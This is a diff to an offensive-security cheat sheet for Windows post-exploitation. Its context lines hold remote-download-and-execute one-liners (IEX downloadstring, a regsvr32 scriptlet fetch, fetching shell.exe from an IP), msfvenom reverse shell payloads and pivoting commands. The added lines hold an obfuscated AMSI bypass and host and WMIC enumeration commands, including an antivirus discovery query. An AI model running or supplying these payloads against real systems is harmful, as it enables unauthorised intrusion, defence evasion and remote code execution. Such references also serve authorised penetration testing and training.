@@ -419,8 +419,8 @@ PSH: `(new-object System.Net.WebClient).DownloadFile('http://10.10.16.33/shell.e
 
 ## Powershell:
 
-powershell.exe -File file.ps1\
-Powershell.exe -c 'code to execute’
+`powershell.exe -File file.ps1`\
+`Powershell.exe -c 'code to execute’`\
 
 Options:
 
@@ -490,7 +490,7 @@ Netcat reverse shell (staged): `msfvenom -p windows/shell/reverse_tcp LHOST=10.0
 ## Port forwarding/masquerading
 
 SOCAT: `socat TCP-LISTEN:80,fork TCP:192.168.1.1:80`\
-IPTables: `iptables -A PREROUTING -t nat -p tcp --dport 80 -j DNAT –to 192.168.1.1:80'
+IPTables: `iptables -A PREROUTING -t nat -p tcp --dport 80 -j DNAT –to 192.168.1.1:80'`
 
 ## Pivoting
 
@@ -521,7 +521,7 @@ on the compromised host: `netsh interface portproxy add v4tov4 listenport=33389 
 ## One liners
 Powershell: `powershell -w hidden -c "[System.Net.SystemPointManager]::ServerCertificateValidationCallback = { $true }; IEX ((new-object net.webclient).downloadstring('https://target/tools'))"`\
 PowerShell IWR: `powershell.exe –c “IEX (Invoke-WebRequest -SkipCertificateCheck -Method 'GET' -Uri 'https://target/tools')`\
-RegSvr32: `regsvr32.exe /s /n /u /i:http://server/file.sct scrobj.dll`\
+RegSvr32: `regsvr32.exe /s /n /u /i:http://server/file.sct scrobj.dll`
 
 
 # Privesc
@@ -533,3 +533,40 @@ Runas saved credentials: `runas /savecred /user:<domain\username> cmd.exe`\
 ## PowerShell
 Amsi bypass:\
 `sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( GeT-VariaBle ( "1Q2U" +"zX" ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System' ) )."g`etf`iElD"( ( "{0}{2}{1}" -f'amsi','d','InitFaile' ),( "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )`
+
+## Host enum (probably detected)
+```
+echo %userdomain%
+echo %logonserver%
+echo %homepath%
+echo %homedrive%
+net share
+net accounts
+systeminfo
+tasklist /svc
+gpresult /z
+net locakgroup administrators
+netsh advfirewall show allprofiles state
+$env
+Tree $home
+```
+
+## WMIC:
+
+```
+wmic process list brief
+wmic group list brief
+wmic computersystem list
+wmic process list brief
+wmic ntdomain list brief
+wmic group list full /format:table
+mic user list full /format:table
+wmic sysaccount list full /format:table
+wmic /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get *
+Get-WmiObject -Class Win32_UserAccount -Filter "LocalAccount='True'" | ft
+```
+
+
+
+
+
